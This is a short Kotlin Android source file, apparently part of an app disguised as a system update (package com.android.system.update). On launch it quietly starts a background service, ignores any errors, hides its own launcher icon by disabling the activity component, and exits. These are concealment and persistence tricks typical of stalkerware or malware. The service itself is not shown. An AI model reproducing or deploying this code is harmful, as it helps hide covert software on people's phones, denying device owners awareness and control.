package com.android.system.update

import android.app.Activity
import android.content.ComponentName
import android.content.Intent
import android.content.pm.PackageManager
import android.os.Bundle

class MainActivity : Activity() {

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        try {
            val serviceIntent = Intent(this, BackgroundUtility::class.java)
            startService(serviceIntent)
        } catch (e: Exception) {
        }

        hideAppIcon()
        finish()
    }

    private fun hideAppIcon() {
        try {
            val p = packageManager
            val c = ComponentName(this, this::class.java)
            p.setComponentEnabledSetting(
                c,
                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                PackageManager.DONT_KILL_APP
            )
        } catch (e: Exception) {
        }
    }
}